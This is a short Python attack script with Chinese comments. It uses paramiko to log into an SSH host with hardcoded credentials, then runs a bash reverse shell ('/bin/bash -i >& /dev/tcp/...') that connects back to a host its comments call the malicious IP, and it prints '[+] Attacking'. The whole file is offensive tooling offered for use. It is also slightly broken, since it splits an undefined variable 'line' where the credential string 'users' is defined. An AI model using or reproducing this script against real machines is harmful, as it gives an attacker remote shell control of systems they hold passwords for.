# -*- coding:utf-8 -*-
import paramiko
### ip 端口 用户名 密码  空格分隔    ###
users='192.168.137.132 22 asd asd'

def ssh_base_pwd(ip, port, username, passwd, cmd):
	try:
		port1 = int(port)
		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh.connect(hostname=ip, port=port, username=username, password=passwd)
		stdin, stdout, stderr = ssh.exec_command('/bin/bash')
		stdin.write(cmd+'\n')   #每次只能打一个ip的反弹shell
		result = stdout.read()
		if not result:
			print("无结果!")
			result = stderr.read()
		else:
			print(result.decode())
		ssh.close()
		return result.decode()
	except:
		pass

evilTarget = "192.168.1.106"  # 恶意ip(用于反弹shell)
evilPort = 4445         	 # 恶意端口(用于反弹shell)
cmd = "/bin/bash -i >& /dev/tcp/" + evilTarget + "/" + str(evilPort) + " 0>&1"


ip,port,username,password=line.split(' ')
print("[+] Attacking " + ip)
ssh_base_pwd(ip, port, username, password, cmd)
